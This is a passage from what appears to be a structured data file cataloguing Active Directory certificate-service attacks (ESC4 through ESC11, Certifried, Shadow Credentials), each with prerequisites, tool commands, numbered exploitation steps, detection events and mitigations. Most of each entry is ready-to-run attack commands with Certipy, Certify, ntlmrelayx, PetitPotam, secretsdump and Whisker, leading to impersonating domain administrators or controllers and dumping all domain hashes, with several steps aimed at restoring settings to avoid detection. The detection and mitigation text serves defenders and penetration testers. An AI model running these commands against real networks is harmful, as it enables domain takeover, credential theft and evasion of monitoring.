        name: "Certipy (modify template)",
        command: "certipy template -u user@domain.local -p password -template TargetTemplate -save-old -dc-ip 10.0.0.1",
        description: "Saves the current template configuration and modifies it for ESC1 exploitation"
      },
      {
        name: "Certipy (restore)",
        command: "certipy template -u user@domain.local -p password -template TargetTemplate -configuration TargetTemplate.json -dc-ip 10.0.0.1",
        description: "Restores the original template configuration after exploitation"
      }
    ],
    steps: [
      "Step 1: Enumerate certificate template ACLs to find templates where you have write access. Use Certify, Certipy, or PowerView to check ACLs on template objects.",
      "Step 2: Save the current template configuration for later restoration: certipy template -u user@domain.local -p password -template TargetTemplate -save-old.",
      "Step 3: Modify the template to enable ESC1 exploitation. Set the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag, add Client Authentication EKU, and ensure your user has enrollment rights.",
      "Step 4: Request a certificate with a privileged user's UPN in the SAN, exploiting the now-vulnerable template as in ESC1.",
      "Step 5: Authenticate using the certificate to obtain a TGT or NTLM hash for the target user.",
      "Step 6: Restore the original template configuration to minimize detection: certipy template -u user@domain.local -p password -template TargetTemplate -configuration TargetTemplate.json.",
      "Step 7: The certificate remains valid regardless of template restoration, providing persistent access."
    ],
    detection: "Monitor for modifications to certificate template objects via Event ID 5136 (Directory Service Object Modification) targeting objects in the Certificate Templates container. Alert on changes to template attributes: msPKI-Certificate-Name-Flag (SAN settings), msPKI-Enrollment-Flag, pKIExtendedKeyUsage (EKU), and the security descriptor. Track who modifies certificate templates and compare against authorized administrators. Implement change monitoring on the entire PKI configuration container.",
    mitigation: "Audit ACLs on all certificate template objects and remove unnecessary write permissions. Only PKI administrators should have write access to templates. Implement a change management process for certificate template modifications. Monitor the PKI configuration container for unauthorized changes. Use Active Directory Integrated DNS to protect PKI objects with appropriate ACLs.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc4"
    ]
  },
  {
    id: "AD-029",
    name: "ESC5 - Vulnerable PKI Object ACLs",
    category: "certificate_abuse",
    description: "ESC5 extends the template ACL vulnerability concept to the broader PKI object hierarchy in Active Directory. The AD CS infrastructure includes several critical objects beyond certificate templates: the CA server object (CN=<CA Name>,CN=Enrollment Services), the NTAuthCertificates object (which controls which CA certificates are trusted for AD authentication), the Cert Publishers group, and the PKI configuration container itself. If an attacker has write access to these objects, they can manipulate the PKI infrastructure in ways that enable authentication abuse. For example, modifying the NTAuthCertificates object to add a rogue CA certificate would allow certificates from an attacker-controlled CA to be trusted for AD authentication. Modifying the CA server's enrollment endpoints or configuration can redirect certificate requests. Write access to the Cert Publishers group allows adding accounts that can publish certificates to the NTAuthCertificates store.",
    prerequisites: [
      "Write permissions on PKI objects: CA server object, NTAuthCertificates, Cert Publishers group, or the PKI configuration container",
      "Understanding of the PKI object hierarchy in AD"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Certipy (enumerate)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Identifies ESC5 vulnerable PKI object ACLs"
      },
      {
        name: "PowerView (PKI ACLs)",
        command: "Get-DomainObjectAcl -SearchBase 'CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}",
        description: "Checks ACLs on all PKI objects in the configuration partition"
      }
    ],
    steps: [
      "Step 1: Enumerate ACLs on all PKI objects in the configuration partition. Check the CA object, NTAuthCertificates, AIA container, CDP container, Certificate Templates container, and Enrollment Services container.",
      "Step 2: Identify misconfigured ACLs that grant write access to non-administrative accounts. Common targets: GenericAll, WriteDACL, WriteOwner on CA or NTAuthCertificates objects.",
      "Step 3: Depending on the access, choose an exploitation path: modify the CA configuration, add a rogue CA to NTAuthCertificates, or modify CA enrollment settings.",
      "Step 4: If you can modify NTAuthCertificates, add a certificate from an attacker-controlled CA, then issue certificates from that CA for AD authentication.",
      "Step 5: If you can modify the CA server object, change enrollment endpoints or security settings to enable further attacks.",
      "Step 6: Use the modified PKI infrastructure for certificate-based attacks (ESC1-style exploitation through the compromised PKI)."
    ],
    detection: "Monitor for modifications to PKI objects in the Configuration partition via Event ID 5136. Alert on changes to NTAuthCertificates, CA server objects, and the Enrollment Services container. Track group membership changes to Cert Publishers and other PKI-related groups. Implement change monitoring on the entire CN=Public Key Services subtree.",
    mitigation: "Audit and lock down ACLs on all PKI objects. Only dedicated PKI administrators should have write access. Implement the principle of least privilege for PKI management. Monitor the NTAuthCertificates object for unauthorized CA certificate additions. Regularly review the PKI configuration partition for unexpected changes.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc5"
    ]
  },
  {
    id: "AD-030",
    name: "ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse",
    category: "certificate_abuse",
    description: "ESC6 exploits the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on a Certificate Authority. When this flag is set on the CA configuration (via certutil -config or the CA's policy module settings), ANY certificate request to that CA can include an arbitrary Subject Alternative Name, regardless of the template's configuration. This means even templates that do not have the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set will accept requestor-supplied SANs when this CA flag is enabled. This is a CA-level misconfiguration rather than a template-level one. An attacker can request a certificate from any authentication template and include a Domain Admin's UPN in the SAN, achieving the same result as ESC1 but against templates that would otherwise be secure. The EDITF_ATTRIBUTESUBJECTALTNAME2 flag was commonly enabled by administrators following older Microsoft documentation for web server certificate enrollment and is a frequent finding in enterprise environments. Microsoft addressed this in May 2022 with KB5014754 which added enforcement of strong certificate mapping.",
    prerequisites: [
      "EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled on the CA",
      "Enrollment rights on any template with an authentication EKU",
      "Enterprise CA deployed in the domain"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Certify (check flag)",
        command: "Certify.exe find",
        description: "Checks CA configuration including the EDITF_ATTRIBUTESUBJECTALTNAME2 flag"
      },
      {
        name: "certutil (check flag)",
        command: "certutil -config \"ca.domain.local\\domain-CA\" -getreg policy\\EditFlags",
        description: "Checks the EditFlags on the CA to see if EDITF_ATTRIBUTESUBJECTALTNAME2 is set"
      },
      {
        name: "Certify (request with SAN)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:User /altname:Administrator",
        description: "Requests a certificate from the User template with an arbitrary SAN (works due to ESC6)"
      },
      {
        name: "Certipy",
        command: "certipy req -u user@domain.local -p password -ca domain-CA -target ca.domain.local -template User -upn Administrator@domain.local",
        description: "Requests a certificate with arbitrary SAN from Linux, exploiting the CA flag"
      }
    ],
    steps: [
      "Step 1: Check if the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set on the CA: certutil -config \"ca.domain.local\\domain-CA\" -getreg policy\\EditFlags. The flag value 0x00040000 indicates it is set.",
      "Step 2: Identify any certificate template with an authentication EKU that you have enrollment rights on. Even the default 'User' template works.",
      "Step 3: Request a certificate and include a SAN with a privileged user's UPN. The CA will honor the SAN request regardless of the template settings.",
      "Step 4: Authenticate with the certificate using PKINIT to obtain a TGT for the specified user.",
      "Step 5: Use the TGT for further domain compromise: DCSync, lateral movement, or persistent access.",
      "Step 6: Note that Microsoft's May 2022 update (KB5014754) introduced strong certificate mapping enforcement that mitigates this attack when fully enforced."
    ],
    detection: "Monitor certificate enrollment events (Event ID 4886, 4887) where the SAN UPN does not match the requesting user. Audit the CA configuration for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. Alert on any certificate request that includes a SAN when the template does not permit it. Track the CA's EditFlags registry value for unauthorized changes.",
    mitigation: "Remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag from the CA: certutil -config \"ca.domain.local\\domain-CA\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2. Restart the CA service after making this change. Apply KB5014754 and enforce strong certificate mapping. Audit CA configurations during regular security assessments. If the flag is needed for legitimate web server certificate enrollment, implement CA manager approval for those requests.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc6"
    ]
  },
  {
    id: "AD-031",
    name: "ESC7 - Vulnerable CA ACLs",
    category: "certificate_abuse",
    description: "ESC7 exploits misconfigured access control lists on the Certificate Authority itself. If an attacker has the ManageCA (CA Administrator) or ManageCertificates (Certificate Manager/Officer) permissions on the CA, they can manipulate the CA configuration and issued certificates. With ManageCA access, the attacker can enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (escalating to ESC6), add themselves as a certificate officer, or modify other CA settings. With ManageCertificates access, the attacker can approve pending certificate requests, which is useful when templates require CA manager approval. The combination of ManageCA + ManageCertificates allows full control over the CA, enabling the attacker to issue certificates for any identity. These permissions are often granted too broadly, especially when the CA was initially set up by IT staff who added their accounts or groups for management convenience.",
    prerequisites: [
      "ManageCA or ManageCertificates permission on the Certificate Authority",
      "Network access to the CA server"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Certipy (enumerate)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Identifies CAs where you have ManageCA or ManageCertificates permissions"
      },
      {
        name: "Certipy (add officer)",
        command: "certipy ca -ca domain-CA -add-officer user -u user@domain.local -p password -dc-ip 10.0.0.1",
        description: "Uses ManageCA rights to add yourself as a certificate officer"
      },
      {
        name: "Certipy (enable SAN)",
        command: "certipy ca -ca domain-CA -enable-template SubCA -u user@domain.local -p password -dc-ip 10.0.0.1",
        description: "Enables a SubCA template on the CA (requires ManageCA)"
      },
      {
        name: "Certipy (issue pending)",
        command: "certipy ca -ca domain-CA -issue-request REQUEST_ID -u user@domain.local -p password -dc-ip 10.0.0.1",
        description: "Approves a pending certificate request using ManageCertificates rights"
      },
      {
        name: "Certify (with SubCA)",
        command: "Certify.exe request /ca:ca.domain.local\\domain-CA /template:SubCA /altname:Administrator",
        description: "Requests a SubCA certificate with arbitrary SAN (request will pend if manager approval required)"
      }
    ],
    steps: [
      "Step 1: Enumerate CA permissions to identify if you have ManageCA or ManageCertificates rights. Use certipy find -vulnerable or check the CA security descriptor directly.",
      "Step 2: If you have ManageCA rights, you can: (a) enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag, (b) add yourself as a certificate officer, or (c) enable additional certificate templates.",
      "Step 3: Use ManageCA to add yourself as a certificate officer (ManageCertificates): certipy ca -ca domain-CA -add-officer yourusername.",
      "Step 4: Enable the SubCA template (or another suitable template) on the CA: certipy ca -ca domain-CA -enable-template SubCA.",
      "Step 5: Request a certificate from the SubCA template with an arbitrary SAN. The request may pend requiring officer approval.",
      "Step 6: Use your ManageCertificates rights to approve the pending request: certipy ca -ca domain-CA -issue-request REQUEST_ID.",
      "Step 7: Retrieve the issued certificate and use it for PKINIT authentication as the target user.",
      "Step 8: Clean up: disable the template, remove the officer role, and remove the EDITF flag if set."
    ],
    detection: "Monitor CA security descriptor changes via Event ID 5136. Track the CA audit log for configuration changes (Event ID 4890 - CA settings changed). Alert on new certificate officers being added. Monitor for templates being enabled/disabled. Event ID 4888 shows denied certificate requests, while 4887 shows approved ones. Track requests approved by non-standard certificate officers.",
    mitigation: "Audit CA permissions and remove ManageCA/ManageCertificates from non-PKI administrators. Implement the principle of least privilege for CA management. Enable CA auditing: certutil -setreg CA\\AuditFilter 127. Regularly review the CA security descriptor. Separate CA management duties: use different accounts for ManageCA and ManageCertificates. Implement role separation enforcement on the CA.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc7"
    ]
  },
  {
    id: "AD-032",
    name: "ESC8 - NTLM Relay to AD CS HTTP Endpoints",
    category: "certificate_abuse",
    description: "ESC8 targets the AD CS web enrollment endpoints that accept NTLM authentication over HTTP. The Certificate Authority Web Enrollment (certsrv) and Certificate Enrollment Web Service (CES) interfaces typically run on HTTP without requiring HTTPS or Extended Protection for Authentication (EPA), making them vulnerable to NTLM relay attacks. An attacker can coerce a high-privilege account (such as a domain controller machine account via PetitPotam or PrinterBug) to authenticate, then relay the NTLM authentication to the CA's HTTP enrollment endpoint to request a certificate as the relayed account. If the relayed account is a domain controller, the attacker obtains a certificate with the DC's identity, which can be used for PKINIT authentication and subsequent DCSync. This attack combines authentication coercion with NTLM relay and AD CS abuse, and it has been one of the most impactful AD escalation paths since its public documentation in 2021.",
    prerequisites: [
      "AD CS web enrollment endpoint (certsrv/CES) accessible over HTTP without EPA",
      "The endpoint must accept NTLM authentication",
      "Ability to coerce or capture NTLM authentication from a high-value account",
      "The CA must have a template that allows the relayed account to enroll (e.g., Machine or DomainController template)"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Impacket ntlmrelayx (AD CS)",
        command: "python3 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
        description: "Relays NTLM authentication to the AD CS web enrollment endpoint to request a certificate"
      },
      {
        name: "PetitPotam (coerce)",
        command: "python3 PetitPotam.py listener_ip dc01.domain.local",
        description: "Coerces the domain controller to authenticate to the attacker's listener"
      },
      {
        name: "Certipy (authenticate)",
        command: "certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1",
        description: "Authenticates using the obtained certificate to extract the DC machine account hash"
      },
      {
        name: "Impacket secretsdump",
        command: "python3 secretsdump.py -k -no-pass domain.local/DC01$@dc01.domain.local",
        description: "Performs DCSync using the DC machine account credentials obtained from certificate auth"
      }
    ],
    steps: [
      "Step 1: Identify AD CS HTTP enrollment endpoints. Check for certsrv (Certificate Authority Web Enrollment) and CES (Certificate Enrollment Web Service): curl -I http://ca.domain.local/certsrv/.",
      "Step 2: Verify the endpoint accepts NTLM authentication and does not require HTTPS or EPA.",
      "Step 3: Start ntlmrelayx targeting the AD CS endpoint: ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController.",
      "Step 4: Coerce authentication from a domain controller using PetitPotam: python3 PetitPotam.py listener_ip dc01.domain.local. The DC will attempt NTLM authentication to your listener.",
      "Step 5: ntlmrelayx relays the DC's authentication to the CA and requests a certificate using the DomainController template. The certificate is issued with the DC's identity.",
      "Step 6: ntlmrelayx outputs the base64-encoded certificate. Decode it and save as a PFX file.",
      "Step 7: Authenticate using the DC certificate: certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1. This returns the DC machine account's NTLM hash.",
      "Step 8: Use the DC hash for DCSync: secretsdump.py domain.local/DC01$@dc01 -hashes :DC_HASH to extract all domain credentials."
    ],
    detection: "Monitor for certificate enrollment events (Event ID 4886, 4887) where the requesting IP address differs from the account's known IP. Alert on certificates issued for DC machine accounts from non-DC IP addresses. Monitor for PetitPotam coercion (Event ID 5145 for EFS named pipe access). Track NTLM authentication to the CA web enrollment endpoints. Network monitoring for HTTP traffic to certsrv from unexpected sources.",
    mitigation: "Disable HTTP endpoints for AD CS enrollment and require HTTPS with Extended Protection for Authentication (EPA). Remove the Certificate Authority Web Enrollment role if not needed. If HTTP enrollment is required, enforce HTTPS and EPA. Apply the PetitPotam patch and disable the EFS service on domain controllers where not needed. Enforce SMB signing to prevent NTLM relay. Enable LDAP signing and channel binding. Consider using Certificate Enrollment Policy (CEP) with Kerberos authentication instead of NTLM-based web enrollment.",
    references: [
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
      "https://www.thehacker.recipes/ad/movement/adcs/esc8",
      "https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/"
    ]
  },
  {
    id: "AD-033",
    name: "ESC9 - No Security Extension (StrongCertificateBindingEnforcement)",
    category: "certificate_abuse",
    description: "ESC9 exploits weak certificate mapping in Active Directory when the StrongCertificateBindingEnforcement registry value is set to 0 or 1 (disabled or compatibility mode). Microsoft introduced strong certificate mapping with KB5014754 (May 2022) to address certificate-based authentication vulnerabilities. When strong mapping is not enforced, certificates are mapped to user accounts based on the SAN (Subject Alternative Name) UPN field alone, without requiring the certificate's security identifier (SID) extension (OID 1.3.6.1.4.1.311.25.2) to match. An attacker with GenericWrite on a target user can change the user's userPrincipalName to match another user, request a certificate as the modified user, then change the UPN back. The certificate now contains a UPN that maps to the original privileged user when strong mapping is not enforced. This attack requires the ability to modify a user's UPN, which is possible with GenericWrite, GenericAll, or WriteProperty on the user object.",
    prerequisites: [
      "StrongCertificateBindingEnforcement is 0 or 1 (not fully enforced)",
      "GenericWrite or similar permissions on a user account",
      "A certificate template with authentication EKU that the attacker can enroll in"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Certipy (modify UPN)",
        command: "certipy account update -u attacker@domain.local -p password -user targetuser -upn Administrator@domain.local -dc-ip 10.0.0.1",
        description: "Changes the target user's UPN to the Administrator's UPN"
      },
      {
        name: "Certipy (request cert)",
        command: "certipy req -u targetuser@domain.local -p password -ca domain-CA -target ca.domain.local -template User",
        description: "Requests a certificate as the modified user (certificate will contain the Administrator UPN)"
      },
      {
        name: "Certipy (restore UPN)",
        command: "certipy account update -u attacker@domain.local -p password -user targetuser -upn targetuser@domain.local -dc-ip 10.0.0.1",
        description: "Restores the original UPN to avoid detection"
      },
      {
        name: "Certipy (authenticate)",
        command: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1",
        description: "Authenticates with the certificate, which maps to Administrator due to weak mapping"
      }
    ],
    steps: [
      "Step 1: Check the StrongCertificateBindingEnforcement value on the domain controller: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement. Value 0 = disabled, 1 = compatibility mode (both vulnerable), 2 = enforced.",
      "Step 2: Identify a user account you have GenericWrite or similar permissions on. This user will be the certificate enrollment proxy.",
      "Step 3: Change the target user's UPN to match the privileged account you want to impersonate: certipy account update -user targetuser -upn Administrator@domain.local.",
      "Step 4: Request a certificate as the modified user. The certificate will contain the Administrator UPN in the SAN.",
      "Step 5: Immediately restore the target user's original UPN to minimize detection window.",
      "Step 6: Authenticate with the certificate. Because strong mapping is not enforced, the certificate maps to the Administrator account based on the UPN alone.",
      "Step 7: Extract the Administrator's NTLM hash from the PKINIT authentication for further exploitation."
    ],
    detection: "Monitor for UPN changes on user accounts (Event ID 5136 for userPrincipalName modification). Alert on UPN values that match privileged accounts. Track certificate requests immediately following UPN changes. Monitor the StrongCertificateBindingEnforcement registry value for unauthorized changes. Audit certificate-based authentication events for UPN mismatches.",
    mitigation: "Set StrongCertificateBindingEnforcement to 2 (full enforcement) on all domain controllers: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2. Apply KB5014754 and all subsequent updates. Monitor for UPN changes on user accounts. Restrict who can modify user attributes in Active Directory.",
    references: [
      "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4",
      "https://www.thehacker.recipes/ad/movement/adcs/esc9"
    ]
  },
  {
    id: "AD-034",
    name: "ESC10 - Weak Certificate Mapping",
    category: "certificate_abuse",
    description: "ESC10 exploits two specific weak certificate mapping configurations controlled by registry values on domain controllers. The first variant (ESC10a) targets CertificateMappingMethods containing UPN mapping (0x4 flag) when StrongCertificateBindingEnforcement is 0. The second variant (ESC10b) targets scenarios where the only mapping method is explicit certificate mapping via the altSecurityIdentities attribute. In ESC10a, if certificate mapping uses UPN and strong mapping is disabled, an attacker with GenericWrite on a user can set the target's UPN to a privileged user's UPN, request a certificate using Schannel (not PKINIT), and authenticate as the privileged user via SChannel certificate auth. ESC10b exploits cases where altSecurityIdentities is used for mapping by modifying this attribute on the target account to point to an attacker-controlled certificate. Both variants exploit the disconnect between certificate issuance (which checks the current UPN at enrollment time) and certificate validation (which checks the UPN at authentication time after it has been changed back).",
    prerequisites: [
      "For ESC10a: CertificateMappingMethods includes 0x4 (UPN mapping) and StrongCertificateBindingEnforcement is 0",
      "For ESC10b: GenericWrite on a user with altSecurityIdentities mapping",
      "Write access to modify user attributes"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Certipy (check)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Checks for ESC10 vulnerable configurations"
      },
      {
        name: "Certipy (Schannel auth)",
        command: "certipy auth -pfx cert.pfx -dc-ip 10.0.0.1 -ldap-shell",
        description: "Authenticates via Schannel (LDAPS) instead of PKINIT for ESC10a exploitation"
      },
      {
        name: "PowerView (set altSecurityIdentities)",
        command: "Set-DomainObject -Identity targetuser -Set @{'altSecurityIdentities'='X509:<I>DC=local,DC=domain,CN=domain-CA<S>CN=attacker'} -Verbose",
        description: "Sets explicit certificate mapping on a target user for ESC10b"
      }
    ],
    steps: [
      "Step 1: Check the certificate mapping configuration on domain controllers. Verify CertificateMappingMethods: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel /v CertificateMappingMethods.",
      "Step 2: For ESC10a: change the target user's UPN, request a certificate, change UPN back, then authenticate via Schannel (LDAPS) instead of PKINIT.",
      "Step 3: For ESC10b: if you have GenericWrite on a user that uses altSecurityIdentities mapping, modify the attribute to map to your certificate.",
      "Step 4: Request a certificate (or use an existing one) that matches the altSecurityIdentities mapping you configured.",
      "Step 5: Authenticate using the certificate. The DC will map the certificate to the target user based on the altSecurityIdentities attribute.",
      "Step 6: Use the authenticated session for privilege escalation or lateral movement."
    ],
    detection: "Monitor for modifications to altSecurityIdentities attribute (Event ID 5136). Track UPN changes as in ESC9. Monitor Schannel-based certificate authentication (distinct from PKINIT). Alert on CertificateMappingMethods registry changes. Audit certificate-based LDAPS authentication events.",
    mitigation: "Remove UPN mapping (0x4) from CertificateMappingMethods if not required. Enable StrongCertificateBindingEnforcement to 2 on all domain controllers. Restrict who can modify altSecurityIdentities attributes on user objects. Apply all Microsoft updates related to certificate-based authentication hardening.",
    references: [
      "https://www.thehacker.recipes/ad/movement/adcs/esc10",
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
    ]
  },
  {
    id: "AD-035",
    name: "ESC11 - NTLM Relay to ICPR (RPC Certificate Enrollment)",
    category: "certificate_abuse",
    description: "ESC11 targets the ICertPassage Remote Protocol (ICPR / MS-ICPR), which is the RPC-based certificate enrollment interface. While ESC8 focuses on HTTP-based enrollment, ESC11 exploits the same NTLM relay concept against the RPC endpoint (CertSrv Request interface via named pipe \\pipe\\cert). When the CA server does not enforce RPC packet privacy (sealing/encryption) on the ICPR interface, NTLM authentication can be relayed to this endpoint to request certificates on behalf of the relayed user. This is significant because organizations that hardened against ESC8 by disabling HTTP enrollment may still be vulnerable via the RPC interface. The attack requires the CA's IF_ENFORCEENCRYPTICERTREQUEST flag to be disabled, which allows unsigned NTLM authentication to the RPC endpoint.",
    prerequisites: [
      "CA does not enforce RPC encryption on the ICPR interface (IF_ENFORCEENCRYPTICERTREQUEST not set)",
      "Ability to coerce or capture NTLM authentication from a high-value account",
      "The relayed account must have enrollment rights on a suitable template"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Certipy (relay)",
        command: "certipy relay -target 'rpc://ca.domain.local' -ca domain-CA -template DomainController",
        description: "Relays NTLM authentication to the ICPR RPC endpoint for certificate enrollment"
      },
      {
        name: "PetitPotam",
        command: "python3 PetitPotam.py listener_ip dc01.domain.local",
        description: "Coerces DC authentication for relay"
      },
      {
        name: "Certipy (check flag)",
        command: "certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable",
        description: "Checks if the CA enforces encryption on RPC enrollment"
      }
    ],
    steps: [
      "Step 1: Identify whether the CA enforces RPC encryption. Use certipy find -vulnerable which checks the IF_ENFORCEENCRYPTICERTREQUEST flag.",
      "Step 2: Start the Certipy relay targeting the RPC endpoint: certipy relay -target rpc://ca.domain.local -ca domain-CA -template DomainController.",
      "Step 3: Coerce authentication from a high-value target (domain controller) using PetitPotam or other coercion techniques.",
      "Step 4: The relayed authentication is used to request a certificate via ICPR. If successful, a certificate is issued for the relayed identity.",
      "Step 5: Authenticate using the obtained certificate to extract the account's NTLM hash.",
      "Step 6: Use the credentials for DCSync or further domain compromise."
    ],
    detection: "Monitor for certificate enrollment via RPC from unexpected source IP addresses. Track NTLM authentication to the CA's RPC endpoint from non-standard sources. Event ID 4886/4887 on the CA with unusual requestor details. Network monitoring for NTLM relay patterns targeting the cert pipe.",
    mitigation: "Enable IF_ENFORCEENCRYPTICERTREQUEST on the CA to require RPC encryption: certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST. Restart the CertSvc service. Enforce SMB signing and NTLM restrictions. Apply PetitPotam patches. Consider disabling NTLM where possible.",
    references: [
      "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/",
      "https://www.thehacker.recipes/ad/movement/adcs/esc11"
    ]
  },
  {
    id: "AD-036",
    name: "Certifried (CVE-2022-26923)",
    category: "certificate_abuse",
    description: "Certifried (CVE-2022-26923) is a critical Active Directory Certificate Services vulnerability that allows any domain user to escalate to Domain Admin by exploiting how AD maps certificates to machine accounts. The vulnerability exists in the way the KDC maps certificates issued to computer accounts. When a computer requests a certificate, the certificate's dNSHostName is used for mapping. An attacker can create a new computer account (using the default MachineAccountQuota of 10), set its dNSHostName to match an existing domain controller's hostname, and request a certificate for this computer. The certificate will contain the DC's DNS name and will be mapped to the DC's machine account during PKINIT authentication, even though it was requested by the attacker's machine account. This effectively allows impersonation of the domain controller, leading to DCSync and complete domain compromise. The vulnerability was discovered by Oliver Lyak and patched by Microsoft in May 2022 (KB5014754).",
    prerequisites: [
      "Ability to create a machine account (MachineAccountQuota > 0 or existing machine account control)",
      "AD CS Enterprise CA with a machine enrollment template (default Machine template)",
      "Unpatched domain controllers (pre-May 2022) or weak certificate mapping enforcement"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Certipy (full attack)",
        command: "certipy account create -u user@domain.local -p password -user FAKE01$ -pass Password123 -dns dc01.domain.local -dc-ip 10.0.0.1",
        description: "Creates a machine account with the DC's dNSHostName"
      },
      {
        name: "Certipy (request cert)",
        command: "certipy req -u FAKE01$@domain.local -p Password123 -ca domain-CA -target ca.domain.local -template Machine",
        description: "Requests a machine certificate that will map to the DC due to the DNS name"
      },
      {
        name: "Certipy (authenticate)",
        command: "certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1",
        description: "Authenticates as the DC using the certificate and extracts the machine account hash"
      },
      {
        name: "Impacket secretsdump",
        command: "python3 secretsdump.py domain.local/DC01$@dc01.domain.local -hashes :DC_HASH",
        description: "Performs DCSync using the DC machine account hash"
      }
    ],
    steps: [
      "Step 1: Create a new computer account using the MachineAccountQuota: certipy account create -user FAKE01$ -pass Password123 -dns dc01.domain.local. The critical step is setting the dNSHostName to match the target DC.",
      "Step 2: Verify the machine account was created with the correct dNSHostName: Get-ADComputer FAKE01 -Properties dNSHostName.",
      "Step 3: Request a machine certificate as the new computer account: certipy req -u FAKE01$ -p Password123 -ca domain-CA -template Machine. The certificate will contain the DC's DNS name.",
      "Step 4: Authenticate using the certificate via PKINIT: certipy auth -pfx dc01.pfx. The KDC maps the certificate to the DC machine account based on the dNSHostName, returning the DC's NTLM hash.",
      "Step 5: Use the DC machine account hash for DCSync: secretsdump.py domain.local/DC01$@dc01 -hashes :DC_HASH.",
      "Step 6: Extract the krbtgt hash and all domain user hashes for complete domain compromise.",
      "Step 7: Clean up: delete the machine account: certipy account delete -u user@domain.local -p password -user FAKE01$ -dc-ip 10.0.0.1."
    ],
    detection: "Monitor for new computer account creation (Event ID 4741) with dNSHostName values matching existing domain controllers. Alert on certificate enrollment for machine accounts from unexpected sources (Event ID 4886/4887). Track dNSHostName attribute modifications on computer objects (Event ID 5136). Monitor for PKINIT authentication (Event ID 4768 with pre-auth type 16) for machine accounts from unexpected IPs.",
    mitigation: "Apply KB5014754 (May 2022) and enforce strong certificate mapping (StrongCertificateBindingEnforcement = 2). Set MachineAccountQuota to 0 to prevent unprivileged users from creating machine accounts. Monitor dNSHostName uniqueness -- no two computer objects should share the same DNS hostname. Restrict who can modify computer account attributes. Enable certificate-based authentication logging.",
    references: [
      "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4",
      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923"
    ]
  },
  {
    id: "AD-037",
    name: "Shadow Credentials",
    category: "credential_theft",
    description: "Shadow Credentials is an attack that abuses the msDS-KeyCredentialLink attribute on AD objects to gain persistent access to an account without knowing its password. The msDS-KeyCredentialLink attribute was introduced with Windows Server 2016 to support passwordless authentication (Windows Hello for Business). It stores public key credentials that can be used for PKINIT pre-authentication. An attacker with write access to this attribute on a user or computer object can add their own key pair, then use the private key to perform PKINIT authentication as the target account. This effectively provides credential-free authentication that persists until the shadow credential is removed from the attribute. The attack is particularly useful for persistence on computer accounts (which cannot be Kerberoasted) and for privilege escalation when combined with RBCD or other attacks that require control over a machine account. The technique was documented by Elad Shamir and implemented in the Whisker tool.",
    prerequisites: [
      "Write access to the msDS-KeyCredentialLink attribute on the target object (GenericAll, GenericWrite, or WriteProperty on the specific attribute)",
      "Domain functional level 2016 or higher",
      "At least one domain controller running Windows Server 2016+"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "Whisker",
        command: "Whisker.exe add /target:targetuser /domain:domain.local /dc:dc01.domain.local",
        description: "Adds a shadow credential to the target user and outputs the Rubeus command to authenticate with it"
      },
      {
        name: "Whisker (list)",
        command: "Whisker.exe list /target:targetuser /domain:domain.local /dc:dc01.domain.local",
        description: "Lists current shadow credentials on the target object"
      },
      {
        name: "Whisker (remove)",
        command: "Whisker.exe remove /target:targetuser /deviceid:DEVICE_GUID /domain:domain.local /dc:dc01.domain.local",
        description: "Removes a specific shadow credential by device ID"
      },
      {
